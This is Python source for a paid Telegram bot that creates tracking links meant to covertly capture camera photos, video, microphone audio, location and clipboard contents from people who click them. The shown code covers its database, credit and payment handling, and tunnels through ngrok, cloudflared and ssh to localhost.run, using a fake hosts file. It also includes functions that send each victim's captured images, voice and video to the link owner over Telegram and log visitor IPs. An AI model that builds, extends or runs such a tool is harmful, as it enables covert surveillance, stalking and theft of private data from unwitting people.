import os, re, sys, json, base64, random, string, sqlite3, socket, traceback
import platform, threading, subprocess, asyncio, urllib.request, time, functools
from datetime import datetime
import requests
from flask import Flask, request, jsonify, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice
from telegram.ext import (Application, CommandHandler, CallbackQueryHandler,
                          MessageHandler, ContextTypes, filters,
                          ChatJoinRequestHandler, PreCheckoutQueryHandler)
from config import *

def log(*a): print("[RCX]", *a, flush=True)
try:
    import telegram as _tg
    log("PTB " + _tg.__version__)
except Exception: pass

PORT = int(os.getenv("PORT", str(PORT)))
HOST = os.getenv("HOST", HOST)

FEATURES = {
    "camera": {"label": "📸 Camera Photo", "facing": True},
    "video":  {"label": "🎥 Video 30s",    "facing": True},
    "mic":    {"label": "🎙️ Mic Record",   "facing": False},
    "call":   {"label": "📞 Call Hint",    "facing": False},
    "loc":    {"label": "📍 Location",     "facing": False},
    "clip":   {"label": "📋 Clipboard",    "facing": False},
    "notif":  {"label": "🔔 Notification", "facing": False},
}

# FIX B: COMBO identifiers referenced by _do_gen and admin panel
COMBO = "combo"
COMBO_LABEL = "🎯 All-in-One Combo"


def bi(text):
    out = []
    for ch in str(text):
        n = ord(ch)
        if 65 <= n <= 90: out.append(chr(0x1D468 + n - 65))
        elif 97 <= n <= 122: out.append(chr(0x1D482 + n - 97))
        elif 48 <= n <= 57: out.append(chr(0x1D7CE + n - 48))
        else: out.append(ch)
    return "".join(out)

def esc(t): return str(t).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
def now(): return datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
def gen_id(n=8): return "".join(random.choices(string.ascii_letters+string.digits, k=n))

def wrap(content):
    return "<blockquote>" + bi(content) + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"

def wrap_url(header, url):
    return ("<blockquote>" + bi(header) + "</blockquote>\n\n"
            "<blockquote><code>" + url + "</code></blockquote>\n\n"
            "<blockquote>" + BRAND + "</blockquote>")

VALID_STYLES = ("primary","success","danger")
def B(text, cb=None, url=None, style=None):
    kw = {}
    if cb: kw["callback_data"] = cb
    if url: kw["url"] = url
    if style and style in VALID_STYLES:
        try: return InlineKeyboardButton(bi(text), style=style, **kw)
        except TypeError: pass
    return InlineKeyboardButton(bi(text), **kw)


# ═══════════ AUTO ERROR RECOVERY SYSTEM ═══════════
ERROR_LOG = []
MAX_ERRORS = 50

def record_error(where, err):
    ERROR_LOG.append((now(), where, str(err)[:200]))
    if len(ERROR_LOG) > MAX_ERRORS: ERROR_LOG.pop(0)
    log("!ERR " + where + ": " + str(err)[:150])

def safe_async(where):
    def deco(fn):
        @functools.wraps(fn)
        async def wrapper(*args, **kwargs):
            try:
                return await fn(*args, **kwargs)
            except Exception as e:
                record_error(where, e)
                try:
                    tb = traceback.format_exc()[:400]
                    log("traceback: " + tb)
                except Exception: pass
                try:
                    update = args[0] if args else None
                    if update and hasattr(update, "effective_chat"):
                        await args[1].bot.send_message(update.effective_chat.id,
                            "<blockquote>" + bi("⚠️ An error occurred\n🔧 Auto-recovery active\n🔄 Please try again\n📞 Admin notified") + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>",
                            parse_mode="HTML")
                except Exception: pass
                return None
        return wrapper
    return deco

def safe_sync(where):
    def deco(fn):
        @functools.wraps(fn)
        def wrapper(*args, **kwargs):
            try: return fn(*args, **kwargs)
            except Exception as e:
                record_error(where, e); return None
        return wrapper
    return deco


# ═══════════ DB ═══════════
# ═══ inline db.py (merged) ═══
import os, sqlite3, threading
# DB_PATH via star import below

DB_LOCK = threading.RLock()
DATABASE_URL = (os.getenv("DATABASE_URL") or "").strip()


def _is_pg(url):
    return url.startswith(("postgres://", "postgresql://"))


if _is_pg(DATABASE_URL):
    import pg8000.dbapi as _pg
    from urllib.parse import urlparse, unquote
    _u = urlparse(DATABASE_URL)
    conn = _pg.connect(
        host=_u.hostname,
        port=_u.port or 5432,
        user=unquote(_u.username or ""),
        password=unquote(_u.password or ""),
        database=(_u.path or "/").lstrip("/") or "neondb",
        ssl_context=True,
    )
    try:
        conn.autocommit = False
    except Exception:
        pass
    BACKEND = "postgres"
else:
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    BACKEND = "sqlite"

print("[RCX] db backend:", BACKEND, flush=True)


class CompatRow:
    def __init__(self, src):
        self._src = src
        try:
            self._keys = list(src.keys())
        except Exception:
            self._keys = []

    def __getitem__(self, k):
        if isinstance(k, int):
            return self._src[self._keys[k]]
        return self._src[k]

    def keys(self):
        return self._keys

    def get(self, k, default=None):
        try:
            return self[k]
        except Exception:
            return default


def _translate(sql):
    if BACKEND != "postgres":
        return sql
    s = sql
    if "INSERT OR REPLACE INTO settings" in s:
        s = s.replace(
            "INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)",
            "INSERT INTO settings(key,value) VALUES(%s,%s) "
            "ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value"
        )
    elif "INSERT OR REPLACE INTO pending_reqs" in s:
        s = s.replace(
            "INSERT OR REPLACE INTO pending_reqs(user_id,channel_id,ts) VALUES(?,?,?)",
            "INSERT INTO pending_reqs(user_id,channel_id,ts) VALUES(%s,%s,%s) "
            "ON CONFLICT (user_id,channel_id) DO UPDATE SET ts = EXCLUDED.ts"
        )
    s = s.replace("?", "%s")
    return s


def _translate_schema(sql):
    if BACKEND != "postgres":
        return sql
    s = sql
    s = s.replace("INTEGER PRIMARY KEY AUTOINCREMENT", "BIGSERIAL PRIMARY KEY")
    s = s.replace("INTEGER PRIMARY KEY", "BIGINT PRIMARY KEY")
    # Foreign-key-ish columns must be BIGINT — Telegram IDs exceed INT32 range
    s = s.replace("user_id INTEGER", "user_id BIGINT")
    s = s.replace("owner INTEGER", "owner BIGINT")
    s = s.replace("link_id INTEGER", "link_id BIGINT")
    s = s.replace("amount INTEGER", "amount BIGINT")
    s = s.replace("credits INTEGER", "credits BIGINT")
    s = s.replace("price INTEGER", "price BIGINT")
    s = s.replace("hits INTEGER", "hits BIGINT")
    s = s.replace("banned INTEGER", "banned BIGINT")
    s = s.replace("active INTEGER", "active BIGINT")
    return s


_RETURNING_TABLES = ("into links", "into clicks", "into channels", "into payments", "into tx")


class CompatCursor:
    def __init__(self, raw_conn):
        # raw_conn is the DB connection. We build a cursor from it.
        self._conn = raw_conn
        self._cur = raw_conn.cursor()
        self._lastrowid = None

    def execute(self, sql, params=()):
        self._lastrowid = None
        t = _translate(sql)
        if BACKEND == "postgres" and t.lstrip().upper().startswith("INSERT"):
            low = t.lower()
            if "returning" not in low and any(tbl in low for tbl in _RETURNING_TABLES):
                t = t.rstrip().rstrip(";") + " RETURNING id"
                self._cur.execute(t, params)
                try:
                    r = self._cur.fetchone()
                    if r is not None:
                        if isinstance(r, dict):
                            self._lastrowid = r.get("id")
                        else:
                            self._lastrowid = r[0]
                except Exception:
                    self._lastrowid = None
                return self
        self._cur.execute(t, params)
        return self

    def executemany(self, sql, seq):
        self._cur.executemany(_translate(sql), seq)
        return self

    def executescript(self, script):
        if BACKEND == "postgres":
            for stmt in _translate_schema(script).split(";"):
                s = stmt.strip()
                if s:
                    self._cur.execute(s)
        else:
            self._cur.executescript(script)
        return self

    def fetchone(self):
        r = self._cur.fetchone()
        if r is None:
            return None
        if BACKEND == "sqlite":
            return r
        cols = [d[0] for d in (self._cur.description or [])]
        d = dict(zip(cols, r)) if cols else {}
        return CompatRow(d)

    def fetchall(self):
        rows = self._cur.fetchall()
        if BACKEND == "sqlite":
            return rows
        cols = [d[0] for d in (self._cur.description or [])]
        return [CompatRow(dict(zip(cols, r))) if cols else CompatRow({}) for r in rows]

    @property
    def lastrowid(self):
        return self._lastrowid


c = CompatCursor(conn)


def init_db():
    with DB_LOCK:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY, username TEXT,
            credits INTEGER DEFAULT 0, banned INTEGER DEFAULT 0,
            joined TEXT, last_active TEXT);
        CREATE TABLE IF NOT EXISTS links(id INTEGER PRIMARY KEY AUTOINCREMENT,
            short_id TEXT UNIQUE, owner INTEGER, feature TEXT, dest TEXT,
            hits INTEGER DEFAULT 0, devices TEXT DEFAULT '', created TEXT,
            active INTEGER DEFAULT 1, camera_facing TEXT DEFAULT 'user');
        CREATE TABLE IF NOT EXISTS clicks(id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id INTEGER, ip TEXT, data TEXT, ts TEXT, device_id TEXT);
        CREATE TABLE IF NOT EXISTS channels(id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT, link TEXT, type TEXT, style TEXT DEFAULT 'primary',
            custom_name TEXT, active INTEGER DEFAULT 1);
        CREATE TABLE IF NOT EXISTS pending_reqs(user_id INTEGER, channel_id TEXT,
            ts TEXT, PRIMARY KEY(user_id, channel_id));
        CREATE TABLE IF NOT EXISTS settings(key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE IF NOT EXISTS payments(id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, credits INTEGER, price INTEGER, ref TEXT,
            screenshot TEXT, ts TEXT, status TEXT DEFAULT 'pending');
        CREATE TABLE IF NOT EXISTS tx(id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, type TEXT, amount INTEGER, note TEXT, ts TEXT);
        """)
        conn.commit()

def setting(k, d=None):
    with DB_LOCK:
        r = c.execute("SELECT value FROM settings WHERE key=?", (k,)).fetchone()
        return r["value"] if r else d

def set_setting(k, v):
    with DB_LOCK:
        c.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)", (k, str(v))); conn.commit()

def feature_cost(feat):
    return int(setting("cost_" + feat, FEATURE_COST_DEFAULT))

def set_feature_cost(feat, val): set_setting("cost_" + feat, val)

def get_user(uid):
    with DB_LOCK: return c.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone()

def find_user(q):
    q = str(q).strip().lstrip("@")
    with DB_LOCK:
        if q.isdigit():
            r = c.execute("SELECT * FROM users WHERE id=?", (int(q),)).fetchone()
            if r: return r
        return c.execute("SELECT * FROM users WHERE LOWER(username)=LOWER(?)", (q,)).fetchone()

def upsert_user(uid, uname):
    with DB_LOCK:
        r = c.execute("SELECT id FROM users WHERE id=?", (uid,)).fetchone()
        if r:
            c.execute("UPDATE users SET username=?, last_active=? WHERE id=?", (uname or "", now(), uid))
        else:
            c.execute("INSERT INTO users(id,username,credits,joined,last_active) VALUES(?,?,0,?,?)",
                      (uid, uname or "", now(), now()))
        conn.commit()

def counts():
    with DB_LOCK:
        u = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        a = c.execute("SELECT COUNT(*) FROM users WHERE banned=0").fetchone()[0]
        d = datetime.utcnow().strftime("%Y-%m-%d")
        l = c.execute("SELECT COUNT(*) FROM links WHERE created LIKE ?", (d+"%",)).fetchone()[0]
        k = c.execute("SELECT COUNT(*) FROM clicks WHERE ts LIKE ?", (d+"%",)).fetchone()[0]
        p = c.execute("SELECT COUNT(*) FROM payments").fetchone()[0]
    return u, a, l, k, p

def is_allowed(uid):
    if int(uid) == int(ADMIN_ID): return True
    return setting("allow_" + str(uid), "") == "1"

def add_allowed(uid):
    was_new = setting("allow_" + str(uid), "") != "1"
    set_setting("allow_" + str(uid), "1")
    if setting("whitelist_ts_" + str(uid), "") == "":
        set_setting("whitelist_ts_" + str(uid), str(int(time.time())))
    bonus_key = "welcome_paid_" + str(uid)
    if was_new and setting(bonus_key, "") != "1":
        try:
            bonus = int(setting("welcome_bonus", "20"))
            if bonus > 0:
                with DB_LOCK:
                    c.execute("UPDATE users SET credits=credits+? WHERE id=?", (bonus, uid))
                    c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                              (uid, "welcome_bonus", bonus, "access_granted", now()))
                    conn.commit()
                set_setting(bonus_key, "1")
                log("welcome bonus +" + str(bonus) + " for " + str(uid))
        except Exception as e:
            record_error("welcome_bonus", e)

def del_allowed(uid):
    with DB_LOCK:
        c.execute("DELETE FROM settings WHERE key=?", ("allow_" + str(uid),)); conn.commit()

def list_allowed():
    with DB_LOCK:
        rows = c.execute("SELECT key FROM settings WHERE key LIKE 'allow_%'").fetchall()
    out = []
    for r in rows:
        k = r["key"]
        if k.startswith("allow_") and k[6:].isdigit():
            uid = int(k[6:])
            u = get_user(uid)
            if u: out.append((uid, u["username"], u["credits"], u["banned"]))
            else: out.append((uid, "-", 0, 0))
    return out

BANNER_KEYS = [
    ("user_panel","👤 User Panel"), ("admin_panel","🛡️ Admin Panel"),
    ("welcome","👋 Welcome"), ("force_join","🚪 Force Join"),
    ("new_link","🔗 New Link"), ("my_links","🎯 My Links"),
    ("credit","💸 Credit"), ("my_stats","📊 My Stats"),
    ("support","💬 Support"), ("link_click","🎯 Click"),
    ("camera_grant","📸 Camera"), ("mic_grant","🎙️ Mic"),
    ("location","📍 Location"), ("users","👥 Users"),
    ("stats","📊 Stats"), ("rates","💎 Rates"),
    ("fj_panel","🚪 FJ"), ("pay_cfg","💳 Payment"),
    ("broadcast","📢 Broadcast"), ("sys_panel","🔧 System"),
    ("banners","🎨 Banners"), ("banner_pick","🎨 Pick"),
    ("id_cmd","🆔 ID"), ("maintenance","🚧 Maintenance"),
]
BANNER_MAP = dict(BANNER_KEYS)

def get_banner(key):
    v = setting("banner_" + key)
    if not v: v = setting("banner_global")
    if not v: return None, None
    if "|" in v:
        fid, typ = v.split("|",1); return fid, typ
    return v, "photo"

def set_banner(key, fid, typ): set_setting("banner_"+key, fid+"|"+typ)

def del_banner(key):
    with DB_LOCK:
        c.execute("DELETE FROM settings WHERE key=?", ("banner_"+key,)); conn.commit()

def broadcast_update(reason=""):
    if setting("auto_update_notify","1") != "1": return 0
    try:
        with DB_LOCK:
            users = c.execute("SELECT id FROM users WHERE banned=0").fetchall()
        sent = 0
        msg = ("🔄 Bot Updated\n"
               "✨ " + (reason if reason else "New changes applied") + "\n"
               "👇 Click /start to reload\n"
               "🎁 Fresh rules and rates")
        body = "<blockquote>" + bi(msg) + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"
        for row in users:
            try:
                requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",
                    data={"chat_id": row["id"], "text": body, "parse_mode": "HTML"}, timeout=6)
                sent += 1
                time.sleep(0.05)
            except Exception: pass
        return sent
    except Exception as e:
        record_error("broadcast_update", e); return 0

def refund_credit(uid, amount, reason="tunnel_fail"):
    try:
        amt = int(amount)
        if amt <= 0: return False
        with DB_LOCK:
            c.execute("UPDATE users SET credits=credits+? WHERE id=?", (amt, uid))
            c.execute("INSERT INTO tx(user_id,type,amount,note,ts) VALUES(?,?,?,?,?)",
                      (uid,"refund",amt,reason,now()))
            conn.commit()
        log("refund: uid=" + str(uid) + " amt=" + str(amt) + " reason=" + reason)
        return True
    except Exception as e:
        record_error("refund", e)
        return False

def notify_admin(text, key="welcome"):
    body = "<blockquote>" + esc(text) + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"
    try:
        fid, typ = get_banner(key)
        if fid:
            try:
                ep = {"photo":"sendPhoto","video":"sendVideo","animation":"sendAnimation"}[typ]
                fld = {"photo":"photo","video":"video","animation":"animation"}[typ]
                requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/"+ep,
                    data={"chat_id":ADMIN_ID, fld:fid, "caption":body, "parse_mode":"HTML"}, timeout=10)
                return
            except Exception: pass
        requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",
            data={"chat_id":ADMIN_ID, "text":body, "parse_mode":"HTML"}, timeout=8)
    except Exception as e: record_error("notify_admin", e)

def notify_owner(oid, text, key="link_click"):
    if not oid or int(oid) == int(ADMIN_ID): return
    body = "<blockquote>" + esc(text) + "</blockquote>\n\n<blockquote>" + BRAND + "</blockquote>"
    try:
        requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",
            data={"chat_id":oid, "text":body, "parse_mode":"HTML"}, timeout=8)
    except Exception as e: record_error("notify_owner", e)

def _owner_send(method, oid, cap, raw, ftype, fname):
    if not oid or int(oid) == int(ADMIN_ID): return
    try:
        requests.post("https://api.telegram.org/bot"+BOT_TOKEN+"/"+method,
            files={ftype:(fname, raw, "application/octet-stream")},
            data={"chat_id":oid, "caption":cap, "parse_mode":"HTML"}, timeout=30)
    except Exception as e: record_error("owner_"+method, e)

def notify_owner_photo(oid, cap, raw): _owner_send("sendPhoto", oid, cap, raw, "photo", "cam.jpg")
def notify_owner_voice(oid, cap, raw): _owner_send("sendVoice", oid, cap, raw, "voice", "mic.webm")
def notify_owner_video(oid, cap, raw): _owner_send("sendVideo", oid, cap, raw, "video", "vid.webm")


TUNNEL = {"url": None, "proc": None}
TUNNEL_GEN = {"n": 0}
REBUILD_LOCK = threading.Lock()
REBUILDING = {"flag": False}
REBUILD_COOLDOWN = {"last": 0}
LAST_LIVE_URL = {"url": ""}
KEEPALIVE_STARTED = {"flag": False}

def _spawn(cmd, env=None):
    return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True, bufsize=1, stdin=subprocess.DEVNULL,
                            start_new_session=True, env=env)


# ═══════════════ TUNNEL PROVIDERS ═══════════════
def _try_ngrok():
    try:
        exe = os.path.expanduser("~/.rcx/ngrok")
        if not os.path.exists(exe):
            log("ngrok: binary missing")
            return None
        fakeetc = os.path.expanduser("~/fakeetc")
        hosts_f = os.path.join(fakeetc, "hosts")
        resolv_f = os.path.join(fakeetc, "resolv.conf")
        for attempt in range(3):
            log("ngrok attempt " + str(attempt+1) + "/3")
            try:
                if TUNNEL.get("proc"):
                    try: TUNNEL["proc"].kill()
                    except Exception: pass
                    time.sleep(1)
                env = os.environ.copy()
                env["GODEBUG"] = "netdns=go+1.1.1.1:53"
                if os.path.exists(hosts_f) and os.path.exists(resolv_f):
                    cmd = ["proot",
                           "-b", hosts_f + ":/etc/hosts",
                           "-b", resolv_f + ":/etc/resolv.conf",
                           exe, "http", str(PORT), "--url=collar-partake-uniformly.ngrok-free.dev", "--log=stdout"]
                else:
                    cmd = [exe, "http", str(PORT), "--url=collar-partake-uniformly.ngrok-free.dev", "--log=stdout"]
                p = _spawn(cmd, env)
                TUNNEL["proc"] = p
                rx = re.compile(r'url=(https://[a-z0-9-]+\.ngrok-free\.(app|dev)|https://[a-z0-9-]+\.ngrok\.io)')
                start = time.time()
                for line in p.stdout:
                    line = line.rstrip()
                    if line: log("ngrok: " + line[:140])
                    m2 = rx.search(line)
                    if m2:
                        url = m2.group(1)
                        log("ngrok URL: " + url)
                        return url
                    if time.time() - start > 90:
                        log("ngrok attempt timeout (90s)")
                        try: p.kill()
                        except Exception: pass
                        break
            except Exception as e:
                record_error("ngrok attempt", e)
        return None
    except Exception as e:
        record_error("ngrok", e)
        return None


def _try_cloudflared():
    try:
        exe = None
        for d in [os.path.expanduser("~/.rcx"), "/tmp/.rcx", "./.rcx"]:
            try:
                os.makedirs(d, exist_ok=True)
                test = os.path.join(d, ".wtest")
                open(test, "w").close(); os.remove(test)
                e = os.path.join(d, "cloudflared")
                if os.path.exists(e):
                    exe = e; break
            except Exception: continue
        if not exe:
            log("cf: no binary")
            return None
        fakeetc = os.path.expanduser("~/fakeetc")
        hosts_f = os.path.join(fakeetc, "hosts")
        resolv_f = os.path.join(fakeetc, "resolv.conf")
        for attempt in range(3):
            log("cf attempt " + str(attempt+1) + "/3")
            try:
                if TUNNEL.get("proc"):
                    try: TUNNEL["proc"].kill()
                    except Exception: pass
                    time.sleep(0.5)
                env = os.environ.copy()
                env["GODEBUG"] = "netdns=go+1.1.1.1:53"
                env["TUNNEL_DNS_EDGE_IP_VERSION"] = "4"
                _cert = os.path.join(os.environ.get("PREFIX", "/data/data/com.termux/files/usr"), "etc/tls/cert.pem")
                if os.path.exists(_cert):
                    env["SSL_CERT_FILE"] = _cert
                    env["CURL_CA_BUNDLE"] = _cert
                args = ["tunnel", "--url", "http://localhost:" + str(PORT),
                        "--no-autoupdate", "--protocol", "http2",
                        "--edge-ip-version", "4"]
                if os.path.exists(hosts_f) and os.path.exists(resolv_f):
                    cmd = ["proot",
                           "-b", hosts_f + ":/etc/hosts",
                           "-b", resolv_f + ":/etc/resolv.conf",
                           exe] + args
                else:
                    cmd = [exe] + args
                p = _spawn(cmd, env)
                TUNNEL["proc"] = p
                rx = re.compile(r"(https://[a-z0-9-]{4,}\.trycloudflare\.com)")
                start = time.time()
                for line in p.stdout:
                    line = line.rstrip()
                    if line: log("cf: " + line[:120])
                    m = rx.search(line)
                    if m:
                        return m.group(1)
                    if time.time() - start > 60:
                        log("cf attempt timeout")
                        try: p.kill()
                        except Exception: pass
                        break
            except Exception as e:
                record_error("cf attempt", e)
        return None
    except Exception as e:
        record_error("cf", e)
        return None

def _try_localhost_run():
    for attempt in range(3):
        try:
            log("lhr attempt " + str(attempt+1) + "/3")
            p = _spawn(["ssh","-T","-o","StrictHostKeyChecking=no",
                        "-o","UserKnownHostsFile=/dev/null","-o","LogLevel=ERROR",
                        "-o","ServerAliveInterval=15","-o","ServerAliveCountMax=3",
                        "-o","ExitOnForwardFailure=yes","-o","ConnectTimeout=30",
                        "-o","AddressFamily=inet",
                        "-R","80:localhost:" + str(PORT),"nokey@localhost.run"])
            TUNNEL["proc"] = p
            rx = re.compile(r"(https://[a-z0-9]{4,}\.lhr\.life)")
            start = time.time()
            for line in p.stdout:
                line = line.rstrip()
                if line: log("lhr: " + line[:120])
                if "admin.localhost.run" in line: continue
                m = rx.search(line)
                if m:
                    url = m.group(1); log("lhr URL: " + url); return url
                if time.time() - start > 45:
                    try: p.kill()
                    except Exception: pass
                    break
        except Exception as e: record_error("lhr attempt", e)
    return None

def _is_hosting():
    for k in ("RENDER","RAILWAY_ENVIRONMENT","DYNO","KOYEB_APP_NAME",
              "FLY_APP_NAME","HEROKU_APP_NAME","IS_HOSTING"):
        if os.getenv(k): return True
    return False

def _setup_fakeetc():
    try:
        d = os.path.expanduser("~/fakeetc")
        os.makedirs(d, exist_ok=True)
        hosts = os.path.join(d, "hosts")
        if not os.path.exists(hosts):
            with open(hosts, "w") as f:
                f.write("127.0.0.1 localhost\n")
                f.write("13.232.27.141 connect.ngrok-agent.com\n")
                f.write("13.232.27.141 update.ngrok-agent.com\n")
                f.write("3.6.96.240 dashboard.ngrok.com\n")
        resolv = os.path.join(d, "resolv.conf")
        if not os.path.exists(resolv):
            with open(resolv, "w") as f:
                f.write("nameserver 1.1.1.1\nnameserver 8.8.8.8\n")
        log("fakeetc ready")
    except Exception as e: record_error("fakeetc", e)

def _try_env():
    for k in ("BASE_URL","PUBLIC_URL","RENDER_EXTERNAL_URL",
              "RAILWAY_STATIC_URL","RAILWAY_PUBLIC_DOMAIN"):
        v = (os.getenv(k) or "").strip()
        if v:
            if not v.startswith("http"):
                v = "https://" + v
            return v.rstrip("/")
    return None

def _cached_url():
    u = setting("tunnel_url", ""); ts = setting("tunnel_ts", "0")
    if not u: return None
    try:
        if time.time() - float(ts) > 1800: return None
    except Exception: return None
    return u


# ═══════════════ TUNNEL WORKER ═══════════════
def tunnel_worker(gen=None):
    if gen is None:
        TUNNEL_GEN["n"] += 1
        gen = TUNNEL_GEN["n"]
    log("tunnel_worker gen=" + str(gen))
    if gen != TUNNEL_GEN["n"]:
        log("stale worker gen=" + str(gen))
        return

    env_url = _try_env()
    if env_url and gen == TUNNEL_GEN["n"]:
        TUNNEL["url"] = env_url
        set_setting("tunnel_url", env_url)
        set_setting("tunnel_ts", str(int(time.time())))
        log("LIVE (env): " + env_url)
        try: notify_admin("✅ Tunnel live (env)\n🔗 " + env_url)
        except Exception: pass
        _start_keepalive()
        return

    log("racing tunnels gen=" + str(gen))
    result = {}
    def r_cf():
        try: result["cf"] = _try_cloudflared()
        except Exception: pass
    def r_ng():
        try: result["ngrok"] = _try_ngrok()
        except Exception: pass
    threading.Thread(target=r_cf, daemon=True).start()
    time.sleep(3)
    if not result.get("cf"):
        threading.Thread(target=r_ng, daemon=True).start()

    start = time.time()
    ngrok_first_at = None
    while time.time() - start < 150:
        if gen != TUNNEL_GEN["n"]:
            return
        chosen = None
        if result.get("cf"):
            chosen = "cf"
        elif result.get("ngrok"):
            if ngrok_first_at is None:
                ngrok_first_at = time.time()
            if time.time() - ngrok_first_at < 20:
                time.sleep(0.5)
                continue
            chosen = "ngrok"
        if chosen:
            if gen != TUNNEL_GEN["n"]:
                return
            TUNNEL["url"] = result[chosen]
            set_setting("tunnel_url", TUNNEL["url"])
            set_setting("tunnel_ts", str(int(time.time())))
            log("LIVE (" + chosen + ") gen=" + str(gen) + ": " + TUNNEL["url"])
            try: notify_admin("✅ Tunnel live (" + chosen + ")\n🔗 " + TUNNEL["url"])
            except Exception: pass
            _start_keepalive()
            return
        time.sleep(0.5)

    if gen == TUNNEL_GEN["n"]:
        log("fallback: lhr")
        lhr = _try_localhost_run()
        if lhr and gen == TUNNEL_GEN["n"]:
            TUNNEL["url"] = lhr
            set_setting("tunnel_url", lhr)
            set_setting("tunnel_ts", str(int(time.time())))
            log("LIVE (lhr-fallback): " + lhr)
            try: notify_admin("⚠️ lhr.life fallback\n🔗 " + lhr)
            except Exception: pass
            _start_keepalive()
            return

    log("ALL FAILED gen=" + str(gen))
    if gen == TUNNEL_GEN["n"]:
        time.sleep(15)
        TUNNEL_GEN["n"] += 1
        threading.Thread(target=tunnel_worker, args=(TUNNEL_GEN["n"],), daemon=True).start()

def _start_keepalive():
    if KEEPALIVE_STARTED["flag"]: return
    KEEPALIVE_STARTED["flag"] = True
    threading.Thread(target=tunnel_keepalive, daemon=True).start()


# ═══════════════ KEEPALIVE ═══════════════
def tunnel_keepalive():
    log("👁️ keepalive started")
    fails = 0
    checks = 0
    while True:
        try:
            time.sleep(25)
            u = TUNNEL.get("url")
            if not u:
                time.sleep(5); continue
            checks += 1
            alive = False
            try:
                rl = requests.get("http://127.0.0.1:" + str(PORT) + "/", timeout=8)
                if rl.status_code == 200:
                    alive = True
            except Exception: pass
            if alive:
                try:
                    r = requests.get(u + "/", timeout=15, allow_redirects=True)
                    body = (r.text or "").lower()[:500]
                    if "err_ngrok_3200" in body or ("endpoint" in body and "offline" in body):
                        log("keepalive: endpoint offline")
                        alive = False
                    elif "no tunnel" in body or "tunnel not found" in body:
                        alive = False
                    elif r.status_code not in (200, 301, 302, 404):
                        alive = False
                except Exception as e:
                    log("keepalive ping err: " + str(e)[:70])
                    alive = False
            if alive:
                if fails > 0:
                    log(f"keepalive: recovered (was {fails})")
                fails = 0
                if checks % 20 == 0:
                    log("👁️ keepalive OK (" + str(checks) + ")")
                continue
            fails += 1
            log("⚠️ keepalive FAIL #" + str(fails) + "/5")
            if fails >= 5:
                log("❌ 5 fails — triggering rebuild")
                safe_rebuild_tunnel("keepalive_5_fails")
                return
        except Exception as e:
            log("keepalive err: " + str(e)[:80])
            time.sleep(10)


def access_expiry_watchdog():
    log("expiry watchdog: started")
    while True:
        try:
            time.sleep(3600)
            try: days = int(setting("access_days", "30"))
            except Exception: days = 30
            if days <= 0: continue
            cutoff = time.time() - (days * 86400)
            with DB_LOCK:
                rows = c.execute("SELECT key FROM settings WHERE key LIKE 'allow_%'").fetchall()
            removed = []
            for r in rows:
                k = r["key"]
                if not k[6:].isdigit(): continue
                uid = int(k[6:])
                if uid == ADMIN_ID: continue
                try: last = float(setting("last_purchase_" + str(uid), "0"))
                except Exception: last = 0
                if last == 0:
                    try: added = float(setting("whitelist_ts_" + str(uid), "0"))
                    except Exception: added = 0
                    if added == 0:
                        set_setting("whitelist_ts_" + str(uid), str(int(time.time())))
                        continue
                    last = added
                if last < cutoff:
                    del_allowed(uid)
                    removed.append(uid)
            if removed:
                for uid in removed:
                    try:
                        notify_admin("🚫 Access removed (no buy in " + str(days) + "d)\n🆔 " + str(uid))
                    except Exception: pass
                log("expiry: removed " + str(len(removed)))
        except Exception as e:
            record_error("expiry_watchdog", e)
            time.sleep(60)

def tunnel_watchdog():
    log("🛡️ watchdog started")
    while True:
        try:
            time.sleep(20)
            p = TUNNEL.get("proc")
            u = TUNNEL.get("url")
            if p and p.poll() is not None:
                if u:
                    log("watchdog: proc dead but URL cached")
                    TUNNEL["proc"] = None
                else:
                    log("watchdog: proc dead + no URL → rebuild")
                    safe_rebuild_tunnel("proc_dead")
        except Exception as e:
            record_error("watchdog", e)
            time.sleep(10)


def safe_rebuild_tunnel(reason=""):
    if not REBUILD_LOCK.acquire(blocking=False):
        log("rebuild: locked, skip (" + reason + ")")
        return False
    try:
        if REBUILDING["flag"]:
            return False
        REBUILDING["flag"] = True
        log("🔧 REBUILD: " + reason)
        TUNNEL_GEN["n"] += 1
        my_gen = TUNNEL_GEN["n"]
        try:
            if TUNNEL.get("proc"):
                TUNNEL["proc"].kill(); time.sleep(0.5)
                try: TUNNEL["proc"].terminate()
                except Exception: pass
        except Exception: pass
        TUNNEL["proc"] = None
        TUNNEL["url"] = None
        try: set_setting("tunnel_url", "")
        except Exception: pass
        for cmd in [["pkill","-9","-f","ssh.*lhr.life"],
                    ["pkill","-9","-f","cloudflared"],
                    ["pkill","-9","-f","ngrok"]]:
            try: subprocess.run(cmd, timeout=3, check=False)
            except Exception: pass
        time.sleep(2)
        try:
            with DB_LOCK:
                c.execute("DELETE FROM settings WHERE key IN ('tunnel_url','tunnel_ts')")
                conn.commit()
        except Exception: pass
        try: notify_admin("🔄 Tunnel dead\n🔧 Auto-fix triggered")
        except Exception: pass
        threading.Thread(target=tunnel_worker, args=(my_gen,), daemon=True).start()
        log("✅ REBUILD dispatched gen=" + str(my_gen))
        return True
    finally:
        REBUILDING["flag"] = False
        REBUILD_LOCK.release()


